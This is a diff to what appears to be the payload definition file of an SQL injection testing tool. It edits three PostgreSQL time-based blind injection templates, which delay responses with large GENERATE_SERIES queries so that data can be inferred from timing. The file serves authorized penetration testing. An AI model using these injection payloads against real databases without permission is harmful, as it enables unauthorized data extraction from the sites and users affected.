@@ -1268,9 +1268,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END);</vector>
         <request>
-            <payload>; SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000);</payload>
+            <payload>; SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000);</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1495,9 +1495,9 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1674,9 +1674,9 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
